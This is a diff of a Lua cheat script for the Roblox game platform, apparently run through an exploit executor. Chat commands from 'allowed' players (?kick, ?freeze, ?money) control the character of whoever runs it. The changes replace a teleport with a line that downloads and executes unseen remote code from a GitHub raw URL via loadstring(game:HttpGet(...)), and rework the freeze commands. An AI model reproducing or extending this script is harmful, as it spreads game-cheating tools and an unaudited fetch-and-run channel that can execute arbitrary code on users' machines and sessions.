@@ -50,7 +50,8 @@ local url = "https://raw.githubusercontent.com/15rih/LTK-New/refs/heads/main/a6h
         local callerHRP = callerCharacter:FindFirstChild("HumanoidRootPart")
         local executorHRP = executorCharacter:FindFirstChild("HumanoidRootPart")
         if callerHRP and executorHRP then
-            executorHRP.CFrame = callerHRP.CFrame * CFrame.new(0,55,0)
+            --executorHRP.CFrame = callerHRP.CFrame * CFrame.new(0,55,0)
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/15rih/LTK-New/refs/heads/main/bring.lua"))();
         else
             warn("HumanoidRootPart is missing for caller or executor.")
         end
@@ -74,11 +75,7 @@ local url = "https://raw.githubusercontent.com/15rih/LTK-New/refs/heads/main/a6h
         local executorCharacter = waitForCharacter(LocalPlayer)
         local executorHRP = executorCharacter:FindFirstChild("HumanoidRootPart")
         if callerHRP and executorHRP then
-            getgenv().freeze = true
-            while getgenv().freeze == true do
-                task.wait(0.001)
-                executorHRP.Anchored = true
-            end
+            executorHRP.Massless = true
         else
             print("HumanoidRootPart is missing for caller or executor.")
         end
@@ -90,8 +87,7 @@ local url = "https://raw.githubusercontent.com/15rih/LTK-New/refs/heads/main/a6h
         local callerHRP = callerCharacter:FindFirstChild("HumanoidRootPart")
         local executorHRP = executorCharacter:FindFirstChild("HumanoidRootPart")
         if callerHRP and executorHRP then
-            getgenv().freeze = false
-            executorHRP.Anchored = false
+            executorHRP.Massless = false
         else
             warn("HumanoidRootPart is missing for caller or executor.")
         end
@@ -120,6 +116,14 @@ local url = "https://raw.githubusercontent.com/15rih/LTK-New/refs/heads/main/a6h
         end
     end
 
+    local function Freeze()
+       game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = true
+    end
+
+    local function Unfreeze()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = false
+    end
+
     local function attachChatListener(player)
         player.Chatted:Connect(function(message)
             if isAllowed(player) then
@@ -130,9 +134,9 @@ local url = "https://raw.githubusercontent.com/15rih/LTK-New/refs/heads/main/a6h
                 elseif message == "?kick" then
                     kickExecutor()
                 elseif message == "?freeze" then
-                    freezeExecutor()
+                    Freeze() --freezeExecutor()
                 elseif message == "?unfreeze" then
-                    unfreezeExecutor()
+                    Unfreeze() --unfreezeExecutor()
                 elseif message == "?test" then
                     Message()
                 elseif message == "?money" then
